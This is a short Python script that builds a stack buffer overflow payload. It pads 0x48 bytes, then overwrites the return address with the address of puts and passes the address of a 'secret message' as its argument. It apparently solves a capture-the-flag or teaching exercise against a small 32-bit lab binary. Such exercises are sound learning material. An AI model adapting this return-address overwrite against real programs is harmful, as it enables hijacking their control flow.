#!/usr/bin/env python

import os
import struct

# Returns a byte object in little endian format.
def p32(num):
	return struct.pack("<I", num)

offset = 0x48
puts_address = 0x08049050
secret_message_address = 0x0804a008

# We must append objects of the same type. So, in order to append the byte object
# returned by p32, we must convert the string to a byte object, using 'b'.
payload = offset * b"A"  + p32(puts_address) + 4 * b"B" + p32(secret_message_address)
os.write(1, payload)


